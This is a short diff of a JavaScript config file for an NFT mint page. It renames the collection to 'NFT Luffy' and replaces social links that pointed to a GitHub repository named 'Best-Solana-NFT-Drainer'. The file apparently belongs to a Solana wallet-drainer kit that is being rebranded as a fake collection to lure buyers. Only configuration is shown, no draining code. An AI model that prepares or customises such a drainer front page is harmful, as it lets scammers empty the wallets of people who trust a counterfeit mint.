@@ -1,10 +1,10 @@
 const collectionInfo = {
-    name: "Yeah Tigers | 0x32Moon", // Name of the collection
+    name: "NFT Luffy | Luffy", // Name of the collection
     title: "{name}", 
-    date: "30.06.2022", // Today Date
+    date: "10.09.2022", // Today Date
     socialMedia: {
-        discord: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/", // Discord link
-        twitter: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/", // Twitter link
+        discord: "", // Discord link
+        twitter: "https://twitter.com/NFTLuffy", // Twitter link
     },
     medias: {
         preview: "gif.gif", // Location logo
